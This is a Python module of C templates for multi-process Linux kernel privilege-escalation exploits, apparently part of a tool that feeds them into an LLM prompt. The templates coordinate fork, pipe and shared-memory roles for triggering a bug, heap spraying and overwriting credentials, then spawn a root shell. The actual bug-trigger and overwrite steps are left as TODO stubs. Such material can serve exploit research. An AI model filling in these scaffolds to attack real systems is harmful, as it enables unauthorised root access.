"""
exploit.multi_process — Multi-process coordination C code templates.

Many real kernel exploits use a multi-process architecture where different
processes handle different roles: triggering the bug, heap spraying, setting
up R/W primitives, and post-exploitation.

Patterns from kernel_PoCs:
  - badnode:          fork()-based, parent-as-target pattern
  - badspin:          multi-process with shared-memory IPC via mmap
  - bad_io_uring:     single-process multi-threaded (io_uring)
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional


# ═════════════════════════════════════════════════════════════════════
# Multi-process coordination templates
# ═════════════════════════════════════════════════════════════════════

_MULTIPROCESS_TEMPLATES: Dict[str, Dict[str, Any]] = {
    "fork_parent_target": {
        "description": (
            "Fork-based exploit where child corrupts parent's cred. "
            "Matches badnode CVE-2023-20938 pattern: parent is the "
            "exploitation target, child does the kernel work."
        ),
        "roles": ["parent (target)", "child (trigger + spray + overwrite)"],
        "ipc": "pipe",
        "code": r"""
/* ── Multi-process: fork + parent-as-target ───────────────────── */
/* Pattern: child exploits bug and overwrites parent's cred       */
/* Parent waits, then verifies privilege escalation               */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/types.h>

/* IPC pipe: child → parent */
static int ipc_pipe[2]; /* [0]=read, [1]=write */

/* Synchronization messages */
#define MSG_TRIGGER_DONE   'T'
#define MSG_SPRAY_DONE     'S'
#define MSG_OVERWRITE_DONE 'O'
#define MSG_EXPLOIT_FAIL   'F'

static void ipc_send(char msg) {
    write(ipc_pipe[1], &msg, 1);
}

static char ipc_wait(void) {
    char msg = 0;
    read(ipc_pipe[0], &msg, 1);
    return msg;
}

/* ── Child process: does the actual exploitation ───────────────── */
static void child_exploit(pid_t parent_pid) {
    close(ipc_pipe[0]); /* child only writes */

    printf("[child] PID=%d, exploiting parent PID=%d\n", getpid(), parent_pid);

    /* Step 1: Trigger the vulnerability */
    // TODO: trigger_vulnerability();
    ipc_send(MSG_TRIGGER_DONE);

    /* Step 2: Heap spray to reclaim freed object */
    // TODO: heap_spray();
    ipc_send(MSG_SPRAY_DONE);

    /* Step 3: Use R/W primitive to find and overwrite parent's cred */
    // TODO: overwrite_parent_cred(parent_pid);
    ipc_send(MSG_OVERWRITE_DONE);

    printf("[child] exploit complete, exiting\n");
    close(ipc_pipe[1]);
    _exit(0);
}

/* ── Parent process: waits for child to finish, then verifies ── */
static int parent_wait_and_verify(pid_t child_pid) {
    close(ipc_pipe[1]); /* parent only reads */

    printf("[parent] PID=%d, waiting for child %d\n", getpid(), child_pid);

    /* Monitor child progress */
    char msg;
    while ((msg = ipc_wait()) != 0) {
        switch (msg) {
        case MSG_TRIGGER_DONE:
            printf("[parent] child triggered bug\n");
            break;
        case MSG_SPRAY_DONE:
            printf("[parent] child completed spray\n");
            break;
        case MSG_OVERWRITE_DONE:
            printf("[parent] child completed cred overwrite\n");
            goto verify;
        case MSG_EXPLOIT_FAIL:
            printf("[parent] child reports failure\n");
            goto cleanup;
        default:
            break;
        }
    }

verify:
    /* Verify privilege escalation via setresuid gate */
    if (setresuid(0, 0, 0) == 0 && setresgid(0, 0, 0) == 0) {
        printf("SYZPLOIT_UID_CHECK uid=%d euid=%d\n", getuid(), geteuid());
        printf("[parent] privilege escalation succeeded!\n");

        /* Run root payload */
        // TODO: root_payload();
        execl("/bin/sh", "/bin/sh", NULL);
    } else {
        printf("[parent] setresuid failed — exploit did not work\n");
    }

cleanup:
    waitpid(child_pid, NULL, 0);
    close(ipc_pipe[0]);
    return 1; /* failure */
}

int main(void) {
    if (pipe(ipc_pipe) < 0) {
        perror("pipe");
        return 1;
    }

    pid_t parent_pid = getpid();
    pid_t child = fork();

    if (child < 0) {
        perror("fork");
        return 1;
    } else if (child == 0) {
        child_exploit(parent_pid);
        /* not reached */
    } else {
        return parent_wait_and_verify(child);
    }
    return 0;
}
""",
    },
    "fork_shared_memory": {
        "description": (
            "Fork-based exploit with shared memory for IPC. "
            "Matches badspin pattern: mmap MAP_SHARED region for "
            "lock-free coordination between processes."
        ),
        "roles": ["coordinator", "trigger", "sprayer"],
        "ipc": "shared_memory",
        "code": r"""
/* ── Multi-process: fork + shared memory IPC ───────────────────── */
/* Pattern: shared mmap region for fast lock-free coordination     */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <stdatomic.h>

/* Shared state — mapped MAP_SHARED between parent and children */
struct shared_state {
    atomic_int phase;          /* current exploit phase */
    atomic_int trigger_ready;  /* trigger process is ready */
    atomic_int spray_ready;    /* spray process is ready */
    atomic_int exploit_result; /* 0=pending, 1=success, -1=fail */
    uint64_t kernel_base;     /* leaked kernel base address */
    uint64_t target_addr;     /* address to overwrite */
    char payload[4096];       /* shared payload buffer */
};

/* Phases */
#define PHASE_INIT      0
#define PHASE_TRIGGER   1
#define PHASE_SPRAY     2
#define PHASE_OVERWRITE 3
#define PHASE_DONE      4

static struct shared_state *shared;

static void wait_for_phase(int phase) {
    while (atomic_load(&shared->phase) < phase) {
        usleep(100);
    }
}

static void set_phase(int phase) {
    atomic_store(&shared->phase, phase);
}

/* ── Process role: trigger ─────────────────────────────────────── */
static void role_trigger(void) {
    printf("[trigger] PID=%d ready\n", getpid());
    atomic_store(&shared->trigger_ready, 1);

    wait_for_phase(PHASE_TRIGGER);
    printf("[trigger] triggering vulnerability...\n");

    // TODO: trigger_vulnerability();

    set_phase(PHASE_SPRAY);
    printf("[trigger] done, waiting for completion\n");
    wait_for_phase(PHASE_DONE);
    _exit(0);
}

/* ── Process role: sprayer ─────────────────────────────────────── */
static void role_sprayer(void) {
    printf("[sprayer] PID=%d ready\n", getpid());
    atomic_store(&shared->spray_ready, 1);

    wait_for_phase(PHASE_SPRAY);
    printf("[sprayer] spraying heap...\n");

    // TODO: heap_spray();

    set_phase(PHASE_OVERWRITE);
    printf("[sprayer] done\n");
    wait_for_phase(PHASE_DONE);
    _exit(0);
}

/* ── Coordinator (parent) ──────────────────────────────────────── */
int main(void) {
    /* Allocate shared memory */
    shared = mmap(NULL, sizeof(*shared),
                  PROT_READ | PROT_WRITE,
                  MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (shared == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    memset(shared, 0, sizeof(*shared));

    printf("[coordinator] PID=%d\n", getpid());

    /* Fork trigger process */
    pid_t trigger_pid = fork();
    if (trigger_pid == 0) { role_trigger(); }

    /* Fork sprayer process */
    pid_t spray_pid = fork();
    if (spray_pid == 0) { role_sprayer(); }

    /* Wait for all children to be ready */
    while (!atomic_load(&shared->trigger_ready) ||
           !atomic_load(&shared->spray_ready)) {
        usleep(100);
    }
    printf("[coordinator] all processes ready\n");

    /* Start exploit phases */
    set_phase(PHASE_TRIGGER);
    wait_for_phase(PHASE_OVERWRITE);

    printf("[coordinator] performing cred overwrite...\n");
    // TODO: overwrite_cred();

    /* Verify */
    if (setresuid(0, 0, 0) == 0 && setresgid(0, 0, 0) == 0) {
        printf("SYZPLOIT_UID_CHECK uid=%d euid=%d\n", getuid(), geteuid());
        printf("[coordinator] root achieved!\n");
        atomic_store(&shared->exploit_result, 1);
    } else {
        printf("[coordinator] exploit failed\n");
        atomic_store(&shared->exploit_result, -1);
    }

    set_phase(PHASE_DONE);
    waitpid(trigger_pid, NULL, 0);
    waitpid(spray_pid, NULL, 0);
    munmap(shared, sizeof(*shared));
    return 0;
}
""",
    },
    "pipeline_processes": {
        "description": (
            "Pipeline of specialized processes connected by pipes. "
            "Each process handles one phase of exploitation, passing "
            "results downstream via pipe."
        ),
        "roles": ["trigger", "spray", "rw_primitive", "post_exploit"],
        "ipc": "pipe_chain",
        "code": r"""
/* ── Multi-process: pipeline architecture ──────────────────────── */
/* Each process handles one exploitation phase                     */
/* Results flow through pipe: trigger → spray → rw → post_exploit  */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <stdint.h>

/* Message passed between pipeline stages */
struct pipeline_msg {
    int status;           /* 0=ok, -1=fail */
    uint64_t leak_addr;   /* leaked kernel address (from trigger) */
    uint64_t kernel_base; /* computed kernel base (from spray) */
    uint64_t cred_addr;   /* target cred address (from rw) */
    char info[256];       /* human-readable status */
};

static int create_pipeline_stage(
    int in_fd,    /* read end from previous stage (-1 for first) */
    void (*stage_fn)(int in_fd, int out_fd),
    int out_fd    /* write end to next stage (-1 for last) */
) {
    int pipe_fds[2] = {-1, -1};

    if (out_fd == -1) {
        /* Need to create pipe for inter-stage communication */
        if (pipe(pipe_fds) < 0) { perror("pipe"); return -1; }
    }

    pid_t pid = fork();
    if (pid < 0) { perror("fork"); return -1; }

    if (pid == 0) {
        /* Child: run stage function */
        int actual_out = (out_fd != -1) ? out_fd : pipe_fds[1];
        if (pipe_fds[0] != -1) close(pipe_fds[0]);
        stage_fn(in_fd, actual_out);
        _exit(0);
    }

    /* Parent: close write end, return read end for next stage */
    if (pipe_fds[1] != -1) close(pipe_fds[1]);
    if (in_fd != -1) close(in_fd);

    return pipe_fds[0]; /* -1 if last stage */
}

/* ── Stage 1: Trigger vulnerability ────────────────────────────── */
static void stage_trigger(int in_fd, int out_fd) {
    (void)in_fd;
    struct pipeline_msg msg = {0};

    printf("[trigger] triggering bug...\n");
    // TODO: trigger and leak an address
    msg.status = 0;
    msg.leak_addr = 0; /* TODO: set leaked address */
    snprintf(msg.info, sizeof(msg.info), "trigger done");

    write(out_fd, &msg, sizeof(msg));
    close(out_fd);
}

/* ── Stage 2: Heap spray ───────────────────────────────────────── */
static void stage_spray(int in_fd, int out_fd) {
    struct pipeline_msg msg;
    read(in_fd, &msg, sizeof(msg));
    close(in_fd);

    if (msg.status != 0) { write(out_fd, &msg, sizeof(msg)); close(out_fd); return; }

    printf("[spray] spraying heap, leak_addr=0x%lx\n", msg.leak_addr);
    // TODO: heap spray, compute kernel base
    msg.kernel_base = 0; /* TODO */
    snprintf(msg.info, sizeof(msg.info), "spray done");

    write(out_fd, &msg, sizeof(msg));
    close(out_fd);
}

/* ── Stage 3: R/W primitive ────────────────────────────────────── */
static void stage_rw(int in_fd, int out_fd) {
    struct pipeline_msg msg;
    read(in_fd, &msg, sizeof(msg));
    close(in_fd);

    if (msg.status != 0) { write(out_fd, &msg, sizeof(msg)); close(out_fd); return; }

    printf("[rw] setting up R/W, kernel_base=0x%lx\n", msg.kernel_base);
    // TODO: establish arb R/W, find cred address
    msg.cred_addr = 0; /* TODO */
    snprintf(msg.info, sizeof(msg.info), "rw ready");

    write(out_fd, &msg, sizeof(msg));
    close(out_fd);
}

/* ── Stage 4: Post-exploitation ────────────────────────────────── */
static void stage_post_exploit(int in_fd, int out_fd) {
    (void)out_fd;
    struct pipeline_msg msg;
    read(in_fd, &msg, sizeof(msg));
    close(in_fd);

    if (msg.status != 0) {
        printf("[post] pipeline failed at earlier stage\n");
        return;
    }

    printf("[post] overwriting cred at 0x%lx\n", msg.cred_addr);
    // TODO: zero cred uid/gid fields, disable SELinux

    /* Verify in this process */
    if (setresuid(0, 0, 0) == 0 && setresgid(0, 0, 0) == 0) {
        printf("SYZPLOIT_UID_CHECK uid=%d euid=%d\n", getuid(), geteuid());
        execl("/bin/sh", "/bin/sh", NULL);
    } else {
        printf("[post] setresuid failed\n");
    }
}

int main(void) {
    int p1[2], p2[2], p3[2];
    pipe(p1); pipe(p2); pipe(p3);

    /* Fork stages in reverse order so pipes are set up */
    pid_t pids[4];

    if ((pids[0] = fork()) == 0) {
        close(p1[0]); close(p2[0]); close(p2[1]); close(p3[0]); close(p3[1]);
        stage_trigger(-1, p1[1]);
        _exit(0);
    }
    if ((pids[1] = fork()) == 0) {
        close(p1[1]); close(p2[0]); close(p3[0]); close(p3[1]);
        stage_spray(p1[0], p2[1]);
        _exit(0);
    }
    if ((pids[2] = fork()) == 0) {
        close(p1[0]); close(p1[1]); close(p2[1]); close(p3[0]);
        stage_rw(p2[0], p3[1]);
        _exit(0);
    }
    if ((pids[3] = fork()) == 0) {
        close(p1[0]); close(p1[1]); close(p2[0]); close(p2[1]); close(p3[1]);
        stage_post_exploit(p3[0], -1);
        _exit(0);
    }

    /* Parent: close all pipe ends and wait */
    close(p1[0]); close(p1[1]);
    close(p2[0]); close(p2[1]);
    close(p3[0]); close(p3[1]);

    for (int i = 0; i < 4; i++) waitpid(pids[i], NULL, 0);
    printf("[main] all stages complete\n");
    return 0;
}
""",
    },
    "watchdog_pattern": {
        "description": (
            "Watchdog process monitors exploit child and handles "
            "crashes/timeouts. Useful for race conditions where the "
            "exploit process may crash before reporting success."
        ),
        "roles": ["watchdog (parent)", "exploiter (child)"],
        "ipc": "pipe + waitpid",
        "code": r"""
/* ── Multi-process: watchdog pattern ───────────────────────────── */
/* Parent watches child; if child crashes, restart up to N times   */
/* If child signals success (via pipe), parent verifies            */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/types.h>

#define MAX_ATTEMPTS 50
#define TIMEOUT_SEC 30

static int status_pipe[2]; /* child → parent status */

/* Message from child to parent */
#define CHILD_MSG_SUCCESS     'S'
#define CHILD_MSG_LEAK_DONE   'L'
#define CHILD_MSG_OVERWRITE   'O'

static void exploit_child(pid_t target_pid) {
    close(status_pipe[0]);

    printf("[child:%d] attempt starting, target=%d\n", getpid(), target_pid);

    // TODO: Run exploit
    // On success: write(status_pipe[1], "S", 1);
    // On partial: write(status_pipe[1], "L", 1);

    close(status_pipe[1]);
    _exit(0);
}

int main(void) {
    int attempt;
    pid_t my_pid = getpid();

    printf("[watchdog] PID=%d, max attempts=%d\n", my_pid, MAX_ATTEMPTS);

    for (attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
        printf("\n[watchdog] === Attempt %d/%d ===\n", attempt, MAX_ATTEMPTS);

        if (pipe(status_pipe) < 0) { perror("pipe"); return 1; }

        pid_t child = fork();
        if (child < 0) { perror("fork"); return 1; }

        if (child == 0) {
            exploit_child(my_pid);
            _exit(1);
        }

        /* Parent: monitor child */
        close(status_pipe[1]);

        /* Set alarm for timeout */
        int timed_out = 0;
        fd_set rfds;
        struct timeval tv = { .tv_sec = TIMEOUT_SEC, .tv_usec = 0 };

        FD_ZERO(&rfds);
        FD_SET(status_pipe[0], &rfds);

        int ret = select(status_pipe[0] + 1, &rfds, NULL, NULL, &tv);

        if (ret > 0) {
            char msg;
            if (read(status_pipe[0], &msg, 1) == 1 && msg == CHILD_MSG_SUCCESS) {
                printf("[watchdog] child reports success!\n");
                close(status_pipe[0]);
                waitpid(child, NULL, 0);

                /* Verify our own cred was overwritten */
                if (setresuid(0, 0, 0) == 0) {
                    setresgid(0, 0, 0);
                    printf("SYZPLOIT_UID_CHECK uid=%d euid=%d\n",
                           getuid(), geteuid());
                    printf("[watchdog] we are root!\n");
                    execl("/bin/sh", "/bin/sh", NULL);
                }
                printf("[watchdog] success reported but setresuid failed, retrying\n");
                continue;
            }
        } else if (ret == 0) {
            printf("[watchdog] timeout, killing child\n");
            kill(child, SIGKILL);
            timed_out = 1;
        }

        close(status_pipe[0]);

        int status;
        waitpid(child, &status, 0);

        if (WIFSIGNALED(status)) {
            printf("[watchdog] child killed by signal %d%s\n",
                   WTERMSIG(status), timed_out ? " (timeout)" : "");
        } else {
            printf("[watchdog] child exited with %d\n", WEXITSTATUS(status));
        }

        /* Small delay between attempts to let kernel state settle */
        usleep(100000); /* 100ms */
    }

    printf("[watchdog] all attempts exhausted\n");
    return 1;
}
""",
    },
}


class MultiProcessLibrary:
    """Library of multi-process exploit coordination templates."""

    def __init__(self) -> None:
        self._templates = _MULTIPROCESS_TEMPLATES

    def get(self, name: str) -> Optional[Dict[str, Any]]:
        """Get a template by name."""
        return self._templates.get(name)

    def get_code(self, name: str) -> Optional[str]:
        """Get just the C code for a template."""
        t = self._templates.get(name)
        return t["code"] if t else None

    def list_all(self) -> List[str]:
        """List all available template names."""
        return list(self._templates.keys())

    def recommend_for_exploit(
        self,
        *,
        overwrites_parent: bool = False,
        needs_retry: bool = False,
        num_phases: int = 2,
    ) -> List[str]:
        """Recommend multi-process patterns for given exploit characteristics."""
        results = []
        if overwrites_parent:
            results.append("fork_parent_target")
        if needs_retry:
            results.append("watchdog_pattern")
        if num_phases >= 3:
            results.append("fork_shared_memory")
            results.append("pipeline_processes")
        if not results:
            results.append("fork_parent_target")
        return results

    def format_for_prompt(self, names: Optional[List[str]] = None) -> str:
        """Format templates for inclusion in an LLM prompt."""
        targets = names or list(self._templates.keys())
        parts = []
        for name in targets:
            t = self._templates.get(name)
            if not t:
                continue
            parts.append(
                f"## Multi-Process Template: {name}\n"
                f"Description: {t['description']}\n"
                f"Roles: {', '.join(t['roles'])}\n"
                f"IPC mechanism: {t['ipc']}\n"
                f"```c\n{t['code'].strip()}\n```"
            )
        return "\n\n".join(parts)
